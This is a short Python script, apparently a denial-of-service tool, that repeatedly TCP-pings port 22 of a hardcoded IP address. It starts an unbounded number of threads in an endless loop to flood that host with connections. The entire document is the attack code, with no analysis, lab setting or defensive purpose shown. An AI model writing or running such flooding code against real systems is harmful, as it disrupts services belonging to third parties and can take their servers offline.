import threading
import requests
from tcping import Ping

def dos():
 ping = Ping('91.239.130.32', 22, 1)
 ping.ping(2)

while True:
 threading.Thread(target=dos).start()
